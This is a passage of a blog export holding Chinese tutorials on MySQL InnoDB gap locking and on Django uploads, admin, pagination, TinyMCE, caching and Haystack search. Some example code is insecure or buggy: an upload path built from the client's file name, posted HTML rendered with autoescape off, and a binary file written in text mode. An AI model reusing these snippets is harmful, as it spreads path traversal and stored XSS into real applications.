src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzI2MS80YzZjOWQ1YjhmMzJmNzFhZTJkNzU5OWEzN2IzYmM3NS5wbmc?x-oss-process=image/format,png\"><br>\n如果是不同的索引，但是指向了同一条记录，那么依然会导致阻塞。<br>\n我的理解是不同索引最后指向了同一条主键id，锁住了注解id，故依然会阻塞，应该不是锁住记录。</p>\n\n<p><strong>4）间隙锁</strong><br><strong>当我们使用范围条件而不是相等条件来检索数据，并请求共享或排他锁时，InnoDB会给所有符合条件的已有数据记录的索引加锁</strong>；<strong>对于键值在条件范围内但是并不存在的记录，叫做间隙gap，InnoDB也会对这些间隙加锁。这种锁机制就是间隙锁。</strong></p>\n\n<p>举例来说，假如emp表中只有101条记录，其empid的值分别是 1,2,…,100,101，下面的SQL：<br>\nSelect * from emp where empid &gt; 100 for update;<br>\n这是一个范围条件的检索，InnoDB不仅会对empid为101的记录加锁，对于大于101的不存在间隙也会加锁。</p>\n\n<p>**Mysql使用间隙锁的目的是防止幻读（应该只是一部分满足，不能完全回避），以满足相关隔离级别的要求。**比如对于上面的情况，如果不加锁，那么其他事务插入了empid为102的记录，则会导致本事务内再次执行上述语句时得到empid为102的记录，也就导致了幻读。另一方面，也是为了满足其回复和复制的需要。<br>\n因此，在使用范围条件检索并锁定记录时，InnoDB的这种间隙加锁机制会阻塞符合条件范围内键值的并发插入，从而导致严重的锁等待。因此，对于并发插入较多的应用，我们要尽量优化业务逻辑，尽量用相等条件来访问更新数据，避免使用范围条件。</p>\n\n<p>还要特别说明的是，InnoDB除了通过范围条件加锁时使用间隙锁外，如果使用相等条件请求给一个不存在的记录加锁，InnoDB也会使用间隙锁！<br><img alt=\"479cc2e7b877b4c6d13b40f63d0fcdbe.png\" class=\"preview\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy5waWFuc2hlbi5jb20vaW1hZ2VzLzc4Mi80NzljYzJlN2I4NzdiNGM2ZDEzYjQwZjYzZDBmY2RiZS5wbmc?x-oss-process=image/format,png\"><br><strong>5）关于恢复和复制的需要，对InnoDB锁机制的影响</strong></p>\n\n<p><strong>Mysql通过BINLog记录执行成功的INSERT、UPDATE、DELETE等更新数据的SQL语句，并由此实现MySQL数据库的回复和主从复制</strong>。Mysql的恢复记录（复制实际就是在Slave Mysql不断的做基于BINLOG的恢复）有以下特点：<br>\n一是MySQL的恢复是SQL语句级的，也就是重新执行BINLOG中的SQL语句。<br>\n二是MySQL的Binlog是按照事务提交的先后顺序记录的，恢复也是按这个顺序进行的。</p>\n\n<p>**根据上述的特点，Mysql的恢复机制要求：在一个事务未提交前，其他并发事务不能插入满足其锁定条件的任何记录，也就是不允许出现幻读。****这已经超过了ISO/ANSI SQL92“可重复读”隔离级别的要求，实际上是要求事务要串行化。这也是许多情况下，InnoDB要用到间隙锁的原因。**比如在用范围条件更新记录时，无论是Read Commited还是Repeatable Read隔离级别，InnoDB都要使用间隙锁，这并不是隔离级别的要求，而是由于Mysql恢复和复制的要求。</p>\n                                    </div>", "log_PostTime": 1584891169, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 上传图片和Admin站点5.2", "log_Intro": "Django 上传图片和Admin站点5.2", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"上传图片\">上传图片</h1>\n\n<ul><li>当Django在处理文件上传的时候，文件数据被保存在request.FILES</li>\n\t<li>FILES中的每个键为&lt;input type=\"file\" name=\"\" /&gt;中的name</li>\n\t<li>注意：FILES只有在请求的方法为POST 且提交的&lt;form&gt;带有enctype=\"multipart/form-data\" 的情况下才会包含数据。否则，FILES 将为一个空的类似于字典的对象</li>\n\t<li>使用模型处理上传文件：将属性定义成models.ImageField类型</li>\n</ul><pre class=\"has\">\n<code>pic=models.ImageField(upload_to='cars/')\n</code></pre>\n\n<ul><li>注意：如果属性类型为ImageField需要安装包Pilow</li>\n</ul><pre class=\"has\">\n<code>pip install Pillow==3.4.1\n</code></pre>\n\n<ul><li>图片存储路径\n\t<ul><li>在项目根目录下创建media文件夹</li>\n\t\t<li>图片上传后，会被保存到“/static/media/cars/图片文件”</li>\n\t\t<li>打开settings.py文件，增加media_root项</li>\n\t</ul></li>\n</ul><pre class=\"has\">\n<code>MEDIA_ROOT=os.path.join(BASE_DIR,\"static/media\")\n</code></pre>\n\n<ul><li>使用django后台管理，遇到ImageField类型的属性会出现一个file框，完成文件上传</li>\n\t<li>手动上传的模板代码</li>\n</ul><pre class=\"has\">\n<code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;文件上传&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;form method=\"post\" action=\"upload/\" enctype=\"multipart/form-data\"&gt;\n        &lt;input type=\"text\" name=\"title\"&gt;&lt;br&gt;\n        &lt;input type=\"file\" name=\"pic\"/&gt;&lt;br&gt;\n        &lt;input type=\"submit\" value=\"上传\"&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>手动上传的视图代码</li>\n</ul><pre class=\"has\">\n<code>from django.conf import settings\n\ndef upload(request):\n    if request.method == \"POST\":\n        f1 = request.FILES['pic']\n        fname = '%s/cars/%s' % (settings.MEDIA_ROOT,f1.name)\n        with open(fname, 'w') as pic:\n            for c in f1.chunks():\n                pic.write(c)\n        return HttpResponse(\"ok\")\n    else:\n        return HttpResponse(\"error\")</code></pre>\n\n<h1 id=\"admin站点\">Admin站点</h1>\n\n<ul><li>通过使用startproject创建的项目模版中，默认Admin被启用</li>\n\t<li>1.创建管理员的用户名和密码</li>\n</ul><pre class=\"has\">\n<code>python manage.py createsuperuser\n然后按提示填写用户名、邮箱、密码\n</code></pre>\n\n<ul><li>2.在应用内admin.py文件完成注册，就可以在后台管理中维护模型的数据</li>\n</ul><pre class=\"has\">\n<code>from django.contrib import admin\nfrom models import *\n\nadmin.site.register(HeroInfo)\n</code></pre>\n\n<ul><li>查找admin文件：在INSTALLED_APPS项中加入django.contrib.admin，Django就会自动搜索每个应用的admin模块并将其导入</li>\n</ul><h1 id=\"modeladmin对象\">ModelAdmin对象</h1>\n\n<ul><li>ModelAdmin类是模型在Admin界面中的表示形式</li>\n\t<li>定义：定义一个类，继承于admin.ModelAdmin，注册模型时使用这个类</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n</code></pre>\n\n<ul><li>通常定义在应用的admin.py文件里</li>\n\t<li>使用方式一：注册参数</li>\n</ul><pre class=\"has\">\n<code>admin.site.register(HeroInfo,HeroAdmin)\n</code></pre>\n\n<ul><li>使用方式二：注册装饰器</li>\n</ul><pre class=\"has\">\n<code>@admin.register(HeroInfo)\nclass HeroAdmin(admin.ModelAdmin):\n</code></pre>\n\n<ul><li>通过重写admin.ModelAdmin的属性规定显示效果，属性主要分为列表页、增加修改页两部分</li>\n</ul><p>列表页选项</p>\n\n<p>“操作选项”的位置</p>\n\n<ul><li>actions_on_top、actions_on_bottom：默认显示在页面的顶部</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    actions_on_top = True\n    actions_on_bottom = True\n</code></pre>\n\n<p>list_display</p>\n\n<ul><li>出现列表中显示的字段</li>\n\t<li>列表类型</li>\n\t<li>在列表中，可以是字段名称，也可以是方法名称，但是方法名称默认不能排序</li>\n\t<li>在方法中可以使用format_html()输出html内容</li>\n</ul><pre class=\"has\">\n<code>在models.py文件中\nfrom django.db import models\nfrom tinymce.models import HTMLField\nfrom django.utils.html import format_html\n\nclass HeroInfo(models.Model):\n    hname = models.CharField(max_length=10)\n    hcontent = HTMLField()\n    isDelete = models.BooleanField()\n    def hContent(self):\n        return format_html(self.hcontent)\n\n在admin.py文件中\nclass HeroAdmin(admin.ModelAdmin):\n    list_display = ['hname', 'hContent']\n</code></pre>\n\n<ul><li>让方法排序，为方法指定admin_order_field属性</li>\n</ul><pre class=\"has\">\n<code>在models.py中HeroInfo类的代码改为如下：\n    def hContent(self):\n        return format_html(self.hcontent)\n    hContent.admin_order_field = 'hname'\n</code></pre>\n\n<ul><li>标题栏名称：将字段封装成方法，为方法设置short_description属性</li>\n</ul><pre class=\"has\">\n<code>在models.py中为HeroInfo类增加方法hName：\n    def hName(self):\n        return self.hname\n    hName.short_description = '姓名'\n    hContent.short_description = '内容'\n\n在admin.py页中注册\nclass HeroAdmin(admin.ModelAdmin):\n    list_display = ['hName', 'hContent']\n</code></pre>\n\n<p>list_filter</p>\n\n<ul><li>右侧栏过滤器，对哪些属性的值进行过滤</li>\n\t<li>列表类型</li>\n\t<li>只能接收字段</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n    list_filter = ['hname', 'hcontent']\n</code></pre>\n\n<p>list_per_page</p>\n\n<ul><li>每页中显示多少项，默认设置为100</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n    list_per_page = 10\n</code></pre>\n\n<p>search_fields</p>\n\n<ul><li>搜索框</li>\n\t<li>列表类型，表示在这些字段上进行搜索</li>\n\t<li>只能接收字段</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n    search_fields = ['hname']\n</code></pre>\n\n<p>增加与修改页选项</p>\n\n<ul><li>fields：显示字段的顺序，如果使用元组表示显示到一行上</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n    fields = [('hname', 'hcontent')]\n</code></pre>\n\n<ul><li>fieldsets：分组显示</li>\n</ul><pre class=\"has\">\n<code>class HeroAdmin(admin.ModelAdmin):\n    ...\n    fieldsets = (\n        ('base', {'fields': ('hname')}),\n        ('other', {'fields': ('hcontent')})\n    )\n</code></pre>\n\n<ul><li>fields与fieldsets两者选一</li>\n</ul><h1 id=\"inlinemodeladmin对象\">InlineModelAdmin对象</h1>\n\n<ul><li>类型InlineModelAdmin：表示在模型的添加或修改页面嵌入关联模型的添加或修改</li>\n\t<li>子类TabularInline：以表格的形式嵌入</li>\n\t<li>子类StackedInline：以块的形式嵌入</li>\n</ul><pre class=\"has\">\n<code>class HeroInline(admin.TabularInline):\n    model = HeroInfo\n\nclass BookAdmin(admin.ModelAdmin):\n    inlines = [\n        HeroInline,\n    ]\n</code></pre>\n\n<h1 id=\"重写admin模板\">重写admin模板</h1>\n\n<ul><li>在项目所在目录中创建templates目录，再创建一个admin目录</li>\n\t<li>设置模板查找目录：修改settings.py的TEMPLATES项，加载模板时会在DIRS列表指定的目录中搜索</li>\n</ul><pre class=\"has\">\n<code>'DIRS': [os.path.join(BASE_DIR, 'templates')],\n</code></pre>\n\n<ul><li>从Django安装的目录下（django/contrib/admin/templates）将模板页面的源文件admin/base_site.html拷贝到第一步建好的目录里</li>\n\t<li>编辑base_site.html文件</li>\n\t<li>刷新页面，发现以刚才编辑的页面效果显示</li>\n\t<li>其它管理后台的模板可以按照相同的方式进行修改</li>\n</ul><p> </p>\n                                    </div>", "log_PostTime": 1584891170, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 分页和使用Ajax5.3", "log_Intro": "Django 分页和使用Ajax5.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"分页\">分页</h1>\n\n<ul><li>Django提供了一些类实现管理数据分页，这些类位于django/core/paginator.py中</li>\n</ul><h1 id=\"paginator对象\">Paginator对象</h1>\n\n<ul><li>Paginator(列表,int)：返回分页对象，参数为列表数据，每面数据的条数</li>\n</ul><p>属性</p>\n\n<ul><li>count：对象总数</li>\n\t<li>num_pages：页面总数</li>\n\t<li>page_range：页码列表，从1开始，例如[1, 2, 3, 4]</li>\n</ul><p>方法</p>\n\n<ul><li>page(num)：下标以1开始，如果提供的页码不存在，抛出InvalidPage异常</li>\n</ul><p>异常exception</p>\n\n<ul><li>InvalidPage：当向page()传入一个无效的页码时抛出</li>\n\t<li>PageNotAnInteger：当向page()传入一个不是整数的值时抛出</li>\n\t<li>EmptyPage：当向page()提供一个有效值，但是那个页面上没有任何对象时抛出</li>\n</ul><h1 id=\"page对象\">Page对象</h1>\n\n<p>创建对象</p>\n\n<ul><li>Paginator对象的page()方法返回Page对象，不需要手动构造</li>\n</ul><p>属性</p>\n\n<ul><li>object_list：当前页上所有对象的列表</li>\n\t<li>number：当前页的序号，从1开始</li>\n\t<li>paginator：当前page对象相关的Paginator对象</li>\n</ul><p>方法</p>\n\n<ul><li>has_next()：如果有下一页返回True</li>\n\t<li>has_previous()：如果有上一页返回True</li>\n\t<li>has_other_pages()：如果有上一页或下一页返回True</li>\n\t<li>next_page_number()：返回下一页的页码，如果下一页不存在，抛出InvalidPage异常</li>\n\t<li>previous_page_number()：返回上一页的页码，如果上一页不存在，抛出InvalidPage异常</li>\n\t<li>len()：返回当前页面对象的个数</li>\n\t<li>迭代页面对象：访问当前页面中的每个对象</li>\n</ul><h1 id=\"示例\">示例</h1>\n\n<p>创建视图pagTest</p>\n\n<pre class=\"has\">\n<code>from django.core.paginator import Paginator\n\ndef pagTest(request, pIndex):\n    list1 = AreaInfo.objects.filter(aParent__isnull=True)\n    p = Paginator(list1, 10)\n    if pIndex == '':\n        pIndex = '1'\n    pIndex = int(pIndex)\n    list2 = p.page(pIndex)\n    plist = p.page_range\n    return render(request, 'booktest/pagTest.html', {'list': list2, 'plist': plist, 'pIndex': pIndex})\n</code></pre>\n\n<p>配置url</p>\n\n<pre class=\"has\">\n<code>url(r'^pag(?P&lt;pIndex&gt;[0-9]*)/$', views.pagTest, name='pagTest'),\n</code></pre>\n\n<p>定义模板pagTest.html</p>\n\n<pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n{%for area in list%}\n&lt;li&gt;{{area.id}}--{{area.atitle}}&lt;/li&gt;\n{%endfor%}\n&lt;/ul&gt;\n\n{%for pindex in plist%}\n{%if pIndex == pindex%}\n{{pindex}}&amp;nbsp;&amp;nbsp;\n{%else%}\n&lt;a href=\"/pag{{pindex}}/\"&gt;{{pindex}}&lt;/a&gt;&amp;nbsp;&amp;nbsp;\n{%endif%}\n{%endfor%}\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n\n<h1 id=\"使用ajax\">使用Ajax</h1>\n\n<ul><li>使用视图通过上下文向模板中传递数据，需要先加载完成模板的静态页面，再执行模型代码，生成最张的html，返回给浏览器，这个过程将页面与数据集成到了一起，扩展性差</li>\n\t<li>改进方案：通过ajax的方式获取数据，通过dom操作将数据呈现到界面上</li>\n\t<li>推荐使用框架的ajax相关方法，不要使用XMLHttpRequest对象，因为操作麻烦且不容易查错</li>\n\t<li>jquery框架中提供了$.ajax、$.get、$.post方法，用于进行异步交互</li>\n\t<li>由于csrf的约束，推荐使用$.get</li>\n\t<li>示例：实现省市区的选择</li>\n\t<li>最终实现效果如图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"229\" src=\"https://img-blog.csdnimg.cn/20191020180307132.gif\" width=\"336\"></p>\n\n<p>引入js文件</p>\n\n<ul><li>js文件属于静态文件，创建目录结构如图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"55\" src=\"https://img-blog.csdnimg.cn/2019102018033332.png\" width=\"131\"></p>\n\n<p>修改settings.py关于静态文件的设置</p>\n\n<pre class=\"has\">\n<code>STATIC_URL = '/static/'\nSTATICFILES_DIRS = [\n    os.path.join(BASE_DIR, 'static'),\n]\n</code></pre>\n\n<p>在models.py中定义模型</p>\n\n<pre class=\"has\">\n<code>class AreaInfo(models.Model):\n    aid = models.IntegerField(primary_key=True)\n    atitle = models.CharField(max_length=20)\n    aPArea = models.ForeignKey('AreaInfo', null=True)\n</code></pre>\n\n<p>生成迁移</p>\n\n<pre class=\"has\">\n<code>python manage.py makemigrations\npython manage.py migrate\n</code></pre>\n\n<p>通过workbench向表中填充示例数据</p>\n\n<ul><li>参见“省市区.sql”</li>\n\t<li>注意将表的名称完成替换</li>\n</ul><p>在views.py中编写视图</p>\n\n<ul><li>index用于展示页面</li>\n\t<li>getArea1用于返回省级数据</li>\n\t<li>getArea2用于根据省、市编号返回市、区信息，格式都为字典对象</li>\n</ul><pre class=\"has\">\n<code>from django.shortcuts import render\nfrom django.http import JsonResponse\nfrom models import AreaInfo\n\ndef index(request):\n    return render(request, 'ct1/index.html')\n\ndef getArea1(request):\n    list = AreaInfo.objects.filter(aPArea__isnull=True)\n    list2 = []\n    for a in list:\n        list2.append([a.aid, a.atitle])\n    return JsonResponse({'data': list2})\n\ndef getArea2(request, pid):\n    list = AreaInfo.objects.filter(aPArea_id=pid)\n    list2 = []\n    for a in list:\n        list2.append({'id': a.aid, 'title': a.atitle})\n    return JsonResponse({'data': list2})\n</code></pre>\n\n<p>在urls.py中配置urlconf</p>\n\n<pre class=\"has\">\n<code>from django.conf.urls import url\nfrom . import views\n\nurlpatterns = [\n    url(r'^$', views.index),\n    url(r'^area1/$', views.getArea1),\n    url(r'^([0-9]+)/$', views.getArea2),\n]\n</code></pre>\n\n<p>主urls.py中包含此应用的url</p>\n\n<pre class=\"has\">\n<code>from django.conf.urls import include, url\nfrom django.contrib import admin\n\nurlpatterns = [\n    url(r'^', include('ct1.urls', namespace='ct1')),\n    url(r'^admin/', include(admin.site.urls)),\n]\n</code></pre>\n\n<p>定义模板index.html</p>\n\n<ul><li>在项目中的目录结构如图：</li>\n</ul><p><img alt=\"\" class=\"has\" height=\"55\" src=\"https://img-blog.csdnimg.cn/20191020180407680.png\" width=\"214\"></p>\n\n<ul><li>修改settings.py的TEMPLATES项，设置DIRS值</li>\n</ul><pre class=\"has\">\n<code>'DIRS': [os.path.join(BASE_DIR, 'templates')],\n</code></pre>\n\n<ul><li>定义模板文件：包含三个select标签，分别存放省市区的信息</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;省市区列表&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;select id=\"pro\"&gt;\n    &lt;option value=\"\"&gt;请选择省&lt;/option&gt;\n&lt;/select&gt;\n&lt;select id=\"city\"&gt;\n    &lt;option value=\"\"&gt;请选择市&lt;/option&gt;\n&lt;/select&gt;\n&lt;select id=\"dis\"&gt;\n    &lt;option value=\"\"&gt;请选择区县&lt;/option&gt;\n&lt;/select&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>在模板中引入jquery文件</p>\n\n<pre class=\"has\">\n<code>&lt;script type=\"text/javascript\" src=\"static/ct1/js/jquery-1.12.4.min.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>编写js代码</p>\n\n<ul><li>绑定change事件</li>\n\t<li>发出异步请求</li>\n\t<li>使用dom添加元素</li>\n</ul><pre class=\"has\">\n<code>    &lt;script type=\"text/javascript\"&gt;\n        $(function(){\n\n            $.get('area1/',function(dic) {\n                pro=$('#pro')\n                $.each(dic.data,function(index,item){\n                    pro.append('&lt;option value='+item[0]+'&gt;'+item[1]+'&lt;/option&gt;');\n                })\n            });\n\n            $('#pro').change(function(){\n                $.post($(this).val()+'/',function(dic){\n                    city=$('#city');\n                    city.empty().append('&lt;option value=\"\"&gt;请选择市&lt;/option&gt;');\n                    $.each(dic.data,function(index,item){\n                        city.append('&lt;option value='+item.id+'&gt;'+item.title+'&lt;/option&gt;');\n                    })\n                });\n            });\n\n            $('#city').change(function(){\n                $.post($(this).val()+'/',function(dic){\n                    dis=$('#dis');\n                    dis.empty().append('&lt;option value=\"\"&gt;请选择区县&lt;/option&gt;');\n                    $.each(dic.data,function(index,item){\n                        dis.append('&lt;option value='+item.id+'&gt;'+item.title+'&lt;/option&gt;');\n                    })\n                })\n            });\n\n        });\n    &lt;/script&gt;</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891171, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 第三方引用富文本编辑器6.1", "log_Intro": "Django 第三方引用富文本编辑器6.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <ul><li>借助富文本编辑器，管理员能够编辑出来一个包含html的页面，从而页面的显示效果，可以由管理员定义，而不用完全依赖于前期开发人员</li>\n\t<li>此处以tinymce为例，其它富文本编辑器的使用可以自行学习</li>\n\t<li>使用编辑器的显示效果为：</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191020181020749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>下载安装</p>\n\n<ul><li>在网站<a href=\"https://pypi.python.org/pypi\" rel=\"nofollow\">pypi网站</a>搜索并下载\"django-tinymce-2.4.0\"</li>\n\t<li>解压</li>\n</ul><pre class=\"has\">\n<code>tar zxvf django-tinymce-2.4.0.tar.gz\n</code></pre>\n\n<ul><li>进入解压后的目录，工作在虚拟环境，安装</li>\n</ul><pre class=\"has\">\n<code>python setup.py install\n</code></pre>\n\n<p>应用到项目中</p>\n\n<ul><li>在settings.py中为INSTALLED_APPS添加编辑器应用</li>\n</ul><pre class=\"has\">\n<code>INSTALLED_APPS = (\n    ...\n    'tinymce',\n)\n</code></pre>\n\n<ul><li>在settings.py中添加编辑配置项</li>\n</ul><pre class=\"has\">\n<code>TINYMCE_DEFAULT_CONFIG = {\n    'theme': 'advanced',\n    'width': 600,\n    'height': 400,\n}\n</code></pre>\n\n<ul><li>在根urls.py中配置</li>\n</ul><pre class=\"has\">\n<code>urlpatterns = [\n    ...\n    url(r'^tinymce/', include('tinymce.urls')),\n]\n</code></pre>\n\n<ul><li>在应用中定义模型的属性</li>\n</ul><pre class=\"has\">\n<code>from django.db import models\nfrom tinymce.models import HTMLField\n\nclass HeroInfo(models.Model):\n    ...\n    hcontent = HTMLField()\n</code></pre>\n\n<ul><li>在后台管理界面中，就会显示为富文本编辑器，而不是多行文本框</li>\n</ul><p>自定义使用</p>\n\n<ul><li>定义视图editor，用于显示编辑器并完成提交</li>\n</ul><pre class=\"has\">\n<code>def editor(request):\n    return render(request, 'other/editor.html')\n</code></pre>\n\n<ul><li>配置url</li>\n</ul><pre class=\"has\">\n<code>urlpatterns = [\n    ...\n    url(r'^editor/$', views.editor, name='editor'),\n]\n</code></pre>\n\n<ul><li>创建模板editor.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n    &lt;script type=\"text/javascript\" src='/static/tiny_mce/tiny_mce.js'&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        tinyMCE.init({\n            'mode':'textareas',\n            'theme':'advanced',\n            'width':400,\n            'height':100\n        });\n    &lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form method=\"post\" action=\"/content/\"&gt;\n    &lt;input type=\"text\" name=\"hname\"&gt;\n    &lt;br&gt;\n    &lt;textarea name='hcontent'&gt;哈哈，这是啥呀&lt;/textarea&gt;\n    &lt;br&gt;\n    &lt;input type=\"submit\" value=\"提交\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<ul><li>定义视图content，接收请求，并更新heroinfo对象</li>\n</ul><pre class=\"has\">\n<code>def content(request):\n    hname = request.POST['hname']\n    hcontent = request.POST['hcontent']\n\n    heroinfo = HeroInfo.objects.get(pk=1)\n    heroinfo.hname = hname\n    heroinfo.hcontent = hcontent\n    heroinfo.save()\n\n    return render(request, 'other/content.html', {'hero': heroinfo})\n</code></pre>\n\n<ul><li>添加url项</li>\n</ul><pre class=\"has\">\n<code>urlpatterns = [\n    ...\n    url(r'^content/$', views.content, name='content'),\n]\n</code></pre>\n\n<ul><li>定义模板content.html</li>\n</ul><pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n姓名：{{hero.hname}}\n&lt;hr&gt;\n{%autoescape off%}\n{{hero.hcontent}}\n{%endautoescape%}\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n                                    </div>", "log_PostTime": 1584891173, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 缓存6.2", "log_Intro": "Django 缓存6.2", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"缓存\">缓存</h1>\n\n<ul><li>对于中等流量的网站来说，尽可能地减少开销是必要的。缓存数据就是为了保存那些需要很多计算资源的结果，这样的话就不必在下次重复消耗计算资源</li>\n\t<li>Django自带了一个健壮的缓存系统来保存动态页面，避免对于每次请求都重新计算</li>\n\t<li>Django提供了不同级别的缓存粒度：可以缓存特定视图的输出、可以仅仅缓存那些很难生产出来的部分、或者可以缓存整个网站</li>\n</ul><p>设置缓存</p>\n\n<ul><li>通过设置决定把数据缓存在哪里，是数据库中、文件系统还是在内存中</li>\n\t<li>通过setting文件的CACHES配置来实现</li>\n\t<li>参数TIMEOUT：缓存的默认过期时间，以秒为单位，这个参数默认是300秒，即5分钟；设置TIMEOUT为None表示永远不会过期，值设置成0造成缓存立即失效</li>\n</ul><pre class=\"has\">\n<code>CACHES={\n    'default': {\n        'BACKEND': 'django.core.cache.backends.locmem.LocMemCache',\n        'TIMEOUT': 60,\n    }\n}\n</code></pre>\n\n<ul><li>可以将cache存到redis中，默认采用1数据库，需要安装包并配置如下：</li>\n</ul><pre class=\"has\">\n<code>安装包：pip install django-redis-cache\n\nCACHES = {\n    \"default\": {\n        \"BACKEND\": \"redis_cache.cache.RedisCache\",\n        \"LOCATION\": \"localhost:6379\",\n        'TIMEOUT': 60,\n    },\n}\n</code></pre>\n\n<ul><li>可以连接redis查看存的数据</li>\n</ul><pre class=\"has\">\n<code>连接：redis-cli\n切换数据库：select 1\n查看键：keys *\n查看值：get 键\n</code></pre>\n\n<p>单个view缓存</p>\n\n<ul><li>django.views.decorators.cache定义了cache_page装饰器，用于对视图的输出进行缓存</li>\n\t<li>示例代码如下：</li>\n</ul><pre class=\"has\">\n<code>from django.views.decorators.cache import cache_page\n\n@cache_page(60 * 15)\ndef index(request):\n    return HttpResponse('hello1')\n    #return HttpResponse('hello2')\n</code></pre>\n\n<ul><li>cache_page接受一个参数：timeout，秒为单位，上例中缓存了15分钟</li>\n\t<li>视图缓存与URL无关，如果多个URL指向同一视图，每个URL将会分别缓存</li>\n</ul><p>模板片断缓存</p>\n\n<ul><li>使用cache模板标签来缓存模板的一个片段</li>\n\t<li>需要两个参数：\n\t<ul><li>缓存时间，以秒为单位</li>\n\t\t<li>给缓存片段起的名称</li>\n\t</ul></li>\n\t<li>示例代码如下：</li>\n</ul><pre class=\"has\">\n<code>{% load cache %}\n{% cache 500 hello %}\nhello1\n&lt;!--hello2--&gt;\n{% endcache %}\n</code></pre>\n\n<p>底层的缓存API</p>\n\n<pre class=\"has\">\n<code>from django.core.cache import cache\n\n设置：cache.set(键,值,有效时间)\n获取：cache.get(键)\n删除：cache.delete(键)\n清空：cache.clear()</code></pre>\n                                    </div>", "log_PostTime": 1584891174, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django 全文检索6.3", "log_Intro": "Django 全文检索6.3", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"全文检索\">全文检索</h1>\n\n<ul><li>全文检索不同于特定字段的模糊查询，使用全文检索的效率更高，并且能够对于中文进行分词处理</li>\n\t<li>haystack：django的一个包，可以方便地对model里面的内容进行索引、搜索，设计为支持whoosh,solr,Xapian,Elasticsearc四种全文检索引擎后端，属于一种全文检索的框架</li>\n\t<li>whoosh：纯Python编写的全文搜索引擎，虽然性能比不上sphinx、xapian、Elasticsearc等，但是无二进制包，程序不会莫名其妙的崩溃，对于小型的站点，whoosh已经足够使用</li>\n\t<li>jieba：一款免费的中文分词包，如果觉得不好用可以使用一些收费产品</li>\n</ul><h1 id=\"操作\">操作</h1>\n\n<p>1.在虚拟环境中依次安装包</p>\n\n<pre class=\"has\">\n<code>pip install django-haystack\npip install whoosh\npip install jieba\n</code></pre>\n\n<p>2.修改settings.py文件</p>\n\n<ul><li>添加应用</li>\n</ul><pre class=\"has\">\n<code>INSTALLED_APPS = (\n    ...\n    'haystack',\n)\n</code></pre>\n\n<ul><li>添加搜索引擎</li>\n</ul><pre class=\"has\">\n<code>HAYSTACK_CONNECTIONS = {\n    'default': {\n        'ENGINE': 'haystack.backends.whoosh_cn_backend.WhooshEngine',\n        'PATH': os.path.join(BASE_DIR, 'whoosh_index'),\n    }\n}\n\n#自动生成索引\nHAYSTACK_SIGNAL_PROCESSOR = 'haystack.signals.RealtimeSignalProcessor'\n</code></pre>\n\n<p>3.在项目的urls.py中添加url</p>\n\n<pre class=\"has\">\n<code>\nurlpatterns = [\n    ...\n    url(r'^search/', include('haystack.urls')),\n]\n</code></pre>\n\n<p>4.在应用目录下建立search_indexes.py文件</p>\n\n<pre class=\"has\">\n<code># coding=utf-8\nfrom haystack import indexes\nfrom models import GoodsInfo\n\n\nclass GoodsInfoIndex(indexes.SearchIndex, indexes.Indexable):\n    text = indexes.CharField(document=True, use_template=True)\n\n    def get_model(self):\n        return GoodsInfo\n\n    def index_queryset(self, using=None):\n        return 